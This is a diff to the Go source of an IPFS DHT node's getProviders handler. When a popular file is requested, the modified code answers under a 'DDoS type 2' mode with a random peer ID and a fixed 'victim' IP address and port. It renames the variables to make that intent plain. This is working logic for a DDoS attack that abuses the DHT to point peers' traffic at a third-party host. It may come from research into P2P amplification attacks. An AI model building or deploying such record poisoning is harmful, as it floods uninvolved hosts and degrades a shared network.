@@ -327,19 +327,14 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 	if providers != nil && len(providers) > 0 {
 		infos := []pstore.PeerInfo{}
 
-		// Here we have to interfere for DDoS type 2
-		// Take a closer look at the maddr format
-		// Array of PeerInfo
-		// ID: peerID
-		// Addrs: []ma.Multiaddr
 		if ddosType == 2 {
 			pid := newRandomPeerId()
-			test, _ := ma.NewMultiaddr("/ip4/80.241.216.122/tcp/3999")
+			victimAddr, _ := ma.NewMultiaddr("/ip4/80.241.216.122/tcp/3999")
 
-			logger.Infof("!!! Popular file requested. Responding with random ID: %s and IP !!!", pid.Pretty())
+			logger.Infof("!!! Popular file requested. Responding with random ID: %s and Victim IP !!!", pid.Pretty())
 			po := pstore.PeerInfo{
 				ID:    pid,
-				Addrs: []ma.Multiaddr{test},
+				Addrs: []ma.Multiaddr{victimAddr},
 			}
 			infos = []pstore.PeerInfo{po}
 		} else {
